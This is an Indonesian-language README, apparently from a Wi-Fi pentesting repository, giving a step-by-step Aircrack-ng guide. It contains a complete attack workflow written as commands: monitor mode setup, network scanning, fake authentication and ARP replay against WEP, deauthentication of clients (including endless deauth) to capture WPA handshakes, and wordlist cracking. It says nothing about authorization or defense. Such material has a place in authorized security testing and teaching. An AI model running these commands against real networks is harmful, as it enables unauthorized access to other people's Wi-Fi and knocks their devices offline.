# Aircrack-NG

![Aircrack-NG](https://github.com/fixploit03/Pentest-WiFi/blob/main/tools/aircrack-ng/img/aircrack-ng.jpg)

## Setup Adapter Wi-Fi

1. Pasang adapter Wi-Fi ke laptop/PC.
2. Pada aplikasi VirtualBox klik tab `Devices` -> `USB` -> `Jenis/merek`.
3. Pastikan checkbox nya sudah tercentang.
4. Buka terminal.
5. Ketikkan `iwconfig`, pastikan nama interface `wlan0` muncul.
6. Kalau sudah muncul, aktifkan mode monitor menggunakan:

   ```
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
7. Cek kembali menggunakan `iwconfig` apakah mode interfacenya sudah berubah menjadi mode `Monitor`.
8. Cek packet injection menggunakan:

   ```
   sudo aireplay-ng --test wlan0
   ```

## Penggunaan

### 1. Scan Wi-Fi:

1. Scan Semua Jaringan (Tanpa Filter):

   ```
   sudo airodump-ng [interface]
   ```
2. Filter berdasarkan Enkripsi:

   - WEP:

      ```
      sudo airodump-ng --encrypt WEP [interface]
      ```
   - WPA/WPA2-PSK

      ```
      sudo airodump-ng --encrypt WPA,WPA2 [interface]
      ```

### 2. Capture Handshake/IVs

1. WEP:

   ```
   sudo airodump-ng --bssid [bssid] --channel [channel] --encrypt WEP --ivs --write [output] [interface]
   ```
2. WPA/WPA2-PSK:

   ```
   sudo airodump-ng --bssid [bssid] --channel [channel] --encrypt WPA,WPA2 --write [output] [interface]
   ```

### 3. Jalankan Serangan:

1. WEP:

   1. Buat autentikasi palsu ke AP target:

      ```
      sudo aireplay-ng --fakeauth 0 -a [bssid] -h [mac_interface] [interface]
      ```
   2. Menangkap dan me-replay paket ARP untuk menghasilkan traffic:

      ```
      sudo aireplay-ng --arpreplay -b [bssid] -h [mac_interface] [interface]
      ```
   3. Tunggu hingga IVs terkumpul cukup banyak.
      - Minimal sekitar 40.000 - 85.000 IVs untuk WEP 64-bit
      - Minimal sekitar 85.000 - 150.000 IVs untuk WEP 128-bit
2. WPA/WPA2-PSK:

   1. Putuskan koneksi client menggunakan Deauth Attack:

      ```
      sudo aireplay-ng --deauth [jumlah] -a [bssid] [interface]
      ```
      
      > **Catatan:**
      > - Kalau ingin deauth client tertentu gunakan opsi `-c [mac_client]` setelah opsi `-a [bssid]`.
      > - Kalau ingin deauth terus-menerus tanpa henti ganti `[jumlah]` dengan `0`.
   2. Tunggu hingga handshake tertangkap.
      - Lihat notifikasi `WPA handshake: [BSSID]` di `airodump-ng`.
### 4. Crack Handshake/IVs

1. WEP:

   ```
   aircrack-ng -a 1 -b [bssid] [file_capture]
   ```
2. WPA/WPA2-PSK:

   ```
   aircrack-ng -a 2 -b [bssid] [file_capture] -w [wordlist]
   ```

## Catatan Penting

1. WEP:
   - Harus ada minimal 1 client yang terhubung ke AP untuk serangan ARP Replay berhasil.
   - Jika tidak ada client yang terhubung, serangan akan gagal karena tidak ada traffic ARP yang bisa di-capture dan di-replay.
2. WPA/WPA2-PSK:
   - Harus ada minimal 1 client yang terhubung untuk melakukan Deauth Attack.
   - Jika tidak ada client, handshake tidak bisa ditangkap karena tidak ada yang bisa di-deauth.

## Video Demonstrasi

1. WEP:

   Link: [https://youtu.be/L1kuud_8Nq4?si=0s5uupcoe9l8KmgP](https://youtu.be/L1kuud_8Nq4?si=0s5uupcoe9l8KmgP)
2. WPA/WPA2-PSK:

   Link: [https://youtu.be/ts5spqeq1Ew?si=OIiFeEqNsAOT4RZ6](https://youtu.be/ts5spqeq1Ew?si=OIiFeEqNsAOT4RZ6)
